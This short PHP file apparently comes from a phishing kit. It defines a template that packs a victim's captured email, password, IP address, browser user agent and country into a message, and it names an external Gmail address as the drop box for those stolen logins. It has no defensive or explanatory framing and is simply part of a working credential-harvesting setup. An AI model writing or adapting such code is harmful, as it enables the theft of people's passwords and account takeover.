<?php

$format = "%s:%s";
$email_format = "Email: %s"."\r\n" . "Password: %s"."\r\n" ."IP: %s"."\r\n" . "User-Agent: %s"."\r\n"."Country: %s";
$email_to = "bigzhangyi5@gmail.com";